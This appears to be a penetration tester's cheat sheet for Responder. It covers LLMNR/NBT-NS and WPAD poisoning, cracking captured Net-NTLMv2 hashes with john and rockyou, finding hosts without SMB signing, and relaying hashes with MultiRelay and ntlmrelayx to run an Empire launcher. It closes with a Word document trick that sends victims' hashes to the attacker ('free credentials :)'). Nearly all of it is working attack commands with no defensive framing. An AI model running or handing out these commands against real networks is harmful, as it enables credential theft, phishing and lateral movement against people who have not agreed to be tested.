# NOTE: do not use the Spiderlab original version of responder since it is not
# mantained anymore, instead use: https://github.com/lgandx/Responder
# Reference: https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
# Common flags:
# -f    fingerprint hosts
# -r    Enable answers for netbios wredir suffix queries. This may break stuff (Default: Off)
# -w    Enable WPAD MiTM
# -P    Force NTLM (transparently)/Basic (prompt) authentication for the proxy.
# Any MiTM server can be turned off in Responder.conf

# Start a MiTM attack with poisoning on all the services we see as "On"
responder -I eth0
;; we can crack the net-ntlmv2 creds by doing:
;; john --format=netntlmv2 --wordlist="/usr/share/wordlists/rockyou.txt" hash.txt 
;; it's adviceable to also use the OneRuleToRuleThemAll ruleset.

# Typical suggested usage
responder -I eth0 -rPv

# Start a MiTM attack and enable WPAD server
responder -I eth0  -wrf


# Responder in Relaying Attacks
You can link responder and multi relay to own machines
;; It's important to know that SMB Signing must be disabled on machines for multirelay.
;; SMB Server must also be off on Responder. Responder will intercept and MultiRelay will relay hashes
 
;; HTTP and SMB are OFF in Responder.conf
responder -I eth0 -rv
responder -I <interface> -r -d -w


;; You can check for machines with disabled SMB Signing with RunFinger (impacket) or CrackMapExec
python RunFinger.py -i 10.0.2.0/24
cme smb <CIDR> --gen-relay-list targets.txt

;; Then you will target one machine or one range for MultiRelay
python MultiRelay.py -t 10.0.2.4 -u ALL
ntlmrelayx.py -tf targets.txt
ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>



## Phishing with Responder
We can craft office documents with images
whose content has to be gathered on the attacking
machine.
So that when the user tries to open our document
he sends its hashes to us.
The procedure is simple:
    Open Word -> CTRL + F9
    IMPORT "\\\\Responder-IP\\1.jpg"
    Right click and select "Edit Field"
    Tick "Data not stored in document"
    Save & close.
    Open the document -> free credentials :)
